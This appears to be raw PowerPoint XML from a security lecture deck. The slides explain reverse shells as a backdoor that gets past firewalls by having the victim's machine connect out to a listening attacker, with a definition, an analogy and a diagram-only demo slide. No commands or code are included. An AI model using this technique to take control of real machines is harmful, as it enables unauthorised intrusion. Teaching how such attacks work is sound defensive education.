          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1467" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Start Client second</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="8" name="Straight Arrow Connector 7"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="13" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5264777" y="444486"/>
            <a:ext cx="1238032" cy="23918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3E7A8F8-8CEA-7F30-B0EF-A79C5B5E1DAC}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="4451087" y="4734999"/>
              <a:ext cx="1440" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="3" name="Ink 2">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{43E7A8F8-8CEA-7F30-B0EF-A79C5B5E1DAC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="4442447" y="4725999"/>
                <a:ext cx="19080" cy="18000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3318379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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reverse Shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Subtitle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A new type of backdoor</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Slide Number Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1" y="6470651"/>
            <a:ext cx="732367" cy="387349"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="ctr"/>
              <a:t>21</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2125122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Motivation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Normal backdoor at victim’s PC needs to be activate by the attacker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Victim can setup a firewall to block the income connecting request</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2050" name="Picture 2" descr="Image result for fire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4518" y="4023199"/>
            <a:ext cx="5601588" cy="219559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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{743F91A7-6CB8-DB6A-2DDD-A6B0E1D0F328}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5935980" y="2324100"/>
            <a:ext cx="502920" cy="25222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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5810B019-E431-AF3A-5D0A-AB6946B1AA80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5105400" y="2720340"/>
            <a:ext cx="5516880" cy="2125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B85E6CB-A996-659F-CCDB-CEA43CE67FF1}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="10490917" y="3355162"/>
              <a:ext cx="4320" cy="4680"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="2" name="Ink 1">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB85E6CB-A996-659F-CCDB-CEA43CE67FF1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10482277" y="3346162"/>
                <a:ext cx="21960" cy="22320"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="198983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bypass firewall?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="997233" y="1737116"/>
            <a:ext cx="8187200" cy="2559191"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Firewall doesn’t block signals sent from victims</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Let the victim sends the signal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Let the attacker listen to the signal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="l"/>
              <a:t>23</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 2" descr="Image result for fire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5750" y="1"/>
            <a:ext cx="5104285" cy="20006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result for firew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5750" y="4296307"/>
            <a:ext cx="5104285" cy="2000676"/>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p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7885330" y="4420697"/>
            <a:ext cx="2631367" cy="14911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n>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8482642" y="4010328"/>
            <a:ext cx="1811009" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Reverse shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF0C4239-EDB3-A542-8E77-FE7AAEEB329A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="892788" y="4696480"/>
            <a:ext cx="6060558" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Think of it like a phone call in reverse. Instead of you calling someone else, the remote computer is calling the attacker's computer, and the attacker is able to answer the call and take control.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent6"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="686110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Reverse shell definition</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reverse shell is getting the connection from the victim or target to your computer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="l"/>
              <a:t>24</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34308799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Reverse shell demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="25" name="Group 24"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="691306" y="3101419"/>
            <a:ext cx="9244345" cy="2167923"/>
            <a:chOff x="1220568" y="4947656"/>
            <a:chExt cx="16789969" cy="4722849"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="26" name="pasted-image.tif"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId2"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="1220568" y="6319169"/>
              <a:ext cx="2050617" cy="2050617"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:miter lim="400000"/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="28" name="Shape 201"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4531579" y="5705086"/>
              <a:ext cx="2122268" cy="1112395"/>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2300"/>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="2133" dirty="0"/>
                <a:t>std input</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="Shape 202"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4550624" y="7663171"/>
              <a:ext cx="2164425" cy="1023276"/>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2300"/>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="1867" dirty="0"/>
                <a:t>std output</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="30" name="Shape 203"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="3381619" y="6442023"/>
              <a:ext cx="1083158" cy="438163"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="31" name="Shape 204"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3321689" y="7804900"/>
              <a:ext cx="1079942" cy="355834"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="32" name="Picture 31"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579816" y="6023612"/>
              <a:ext cx="5434477" cy="101603"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="33" name="Picture 32"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579818" y="6463892"/>
              <a:ext cx="5434478" cy="101604"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="34" name="Picture 33"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579818" y="7937137"/>
              <a:ext cx="5434478" cy="101604"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="35" name="Picture 34"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579818" y="8428218"/>
              <a:ext cx="5434478" cy="101604"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="36" name="Shape 213"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1" flipV="1">
              <a:off x="12026615" y="6185254"/>
              <a:ext cx="1092679" cy="380241"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="37" name="Shape 214"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="12117936" y="7804899"/>
              <a:ext cx="838107" cy="523630"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="38" name="Shape 215"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="8298014" y="6294553"/>
              <a:ext cx="2390972" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="39" name="Shape 216"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8233576" y="8233479"/>
              <a:ext cx="2519848" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="40" name="Shape 217"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8901674" y="4947656"/>
              <a:ext cx="1379383" cy="1529499"/>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1900" b="1">
                  <a:latin typeface="Helvetica"/>
                  <a:ea typeface="Helvetica"/>
                  <a:cs typeface="Helvetica"/>
                  <a:sym typeface="Helvetica"/>
                </a:defRPr>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800" b="0"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="3377" dirty="0" err="1"/>
                <a:t>tcp</a:t>
              </a:r>
              <a:endParaRPr sz="3377" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41" name="Shape 218"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9012254" y="8141006"/>
              <a:ext cx="1379383" cy="1529499"/>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sz="1900" b="1">
                  <a:latin typeface="Helvetica"/>
                  <a:ea typeface="Helvetica"/>
                  <a:cs typeface="Helvetica"/>
                  <a:sym typeface="Helvetica"/>
                </a:defRPr>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800" b="0"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="3377"/>
                <a:t>tcp</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42" name="Shape 219"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="13351927" y="6095079"/>
              <a:ext cx="3841634" cy="1112395"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:miter lim="400000"/>
            </a:ln>
            <a:extLst>
              <a:ext uri="{C572A759-6A51-4108-AA02-DFA0A04FC94B}">
                <ma14:wrappingTextBoxFlag xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" xmlns="" val="1"/>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="2133" dirty="0"/>
                <a:t>puts input</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="43" name="Shape 220"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="13246136" y="7266198"/>
              <a:ext cx="4764401" cy="1112395"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:miter lim="400000"/>
            </a:ln>
            <a:extLst>
              <a:ext uri="{C572A759-6A51-4108-AA02-DFA0A04FC94B}">
                <ma14:wrappingTextBoxFlag xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" xmlns="" val="1"/>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="2133" dirty="0"/>
                <a:t>receive</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="2133" dirty="0"/>
                <a:t> output</a:t>
              </a:r>
              <a:endParaRPr sz="2133" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="45" name="Picture 44"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9675751" y="3705465"/>
            <a:ext cx="1357165" cy="870848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Shape 198"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774914" y="4722416"/>
            <a:ext cx="851932" cy="674832"/>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b="1">
                <a:solidFill>
                  <a:srgbClr val="00882B"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
                <a:ea typeface="Helvetica"/>
                <a:cs typeface="Helvetica"/>
                <a:sym typeface="Helvetica"/>
